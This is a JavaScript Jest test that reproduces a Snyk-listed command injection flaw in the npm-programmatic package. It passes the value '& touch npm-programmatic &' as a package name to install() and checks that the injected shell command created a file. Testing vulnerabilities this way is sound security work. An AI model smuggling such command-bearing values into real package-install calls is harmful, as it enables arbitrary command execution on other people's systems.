//https://snyk.io/vuln/SNYK-JS-NPMPROGRAMMATIC-564115
test("Command Injection in npm-programmatic", () => {
  const root = require("npm-programmatic");
  const fs = require("fs");
  const path = "./npm-programmatic";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = "& touch npm-programmatic &";
  root.install([attack_code], { cwd: "./" });
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
